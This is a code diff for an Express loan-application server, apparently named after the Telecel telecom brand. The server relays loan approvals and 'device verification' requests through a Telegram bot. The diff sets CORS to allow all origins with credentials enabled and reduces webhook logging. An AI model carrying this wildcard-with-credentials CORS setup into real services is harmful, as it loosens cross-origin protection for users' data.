@@ -3,11 +3,24 @@ const cors = require('cors');
 const app = express();
 const PORT = process.env.PORT || 5000;
 
-// Middleware
-app.use(cors());
+// ─── CORS CONFIGURATION ───
+const corsOptions = {
+  origin: '*', // Allow all origins (for development)
+  methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
+  allowedHeaders: ['Content-Type', 'Authorization', 'Accept'],
+  credentials: true,
+  optionsSuccessStatus: 200
+};
+
+// Apply CORS middleware
+app.use(cors(corsOptions));
+
+// Handle preflight requests
+app.options('*', cors(corsOptions));
+
 app.use(express.json());
 
-// Simple in-memory storage (no database needed!)
+// Simple in-memory storage
 const users = [];
 const loans = [];
 
@@ -209,7 +222,6 @@ app.put('/api/loans/:id/status', async (req, res) => {
       loan.disbursed_at = new Date();
     }
     
-    // ─── SEND STATUS UPDATE TO TELEGRAM ───
     const statusEmoji = status === 'approved' ? '✅' : 
                         status === 'rejected' ? '❌' : 
                         status === 'disbursed' ? '💰' : '📝';
@@ -300,18 +312,15 @@ app.post('/api/telegram/test', async (req, res) => {
 app.post('/api/telegram/webhook', async (req, res) => {
   try {
     const { body } = req;
-    console.log('📨 Webhook received:', JSON.stringify(body, null, 2));
+    console.log('📨 Webhook received');
     
-    // Handle callback queries
     if (body.callback_query) {
-      const { data, id, from } = body.callback_query;
-      console.log(`📱 Callback: ${data} from ${from.username || from.id}`);
+      const { data, id } = body.callback_query;
+      console.log(`📱 Callback: ${data}`);
       
-      // Parse the callback data
       const [action, loanId] = data.split('_');
       
       if (action === 'approve') {
-        // Find and update loan
         const loan = loans.find(l => l.id === loanId);
         if (loan) {
           loan.status = 'approved';
@@ -327,7 +336,6 @@ app.post('/api/telegram/webhook', async (req, res) => {
         await sendTelegramMessage(`📱 Device verification requested for loan ${loanId}.`);
       }
       
-      // Acknowledge the callback
       await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -351,6 +359,7 @@ app.listen(PORT, () => {
   console.log(`🚀 TelecelLoans Server running on port ${PORT}`);
   console.log(`📍 http://localhost:${PORT}`);
   console.log(`📱 Telegram Bot: @TelecelCashbot`);
+  console.log(`🌐 CORS enabled for all origins`);
 });
 
 // Export for Railway
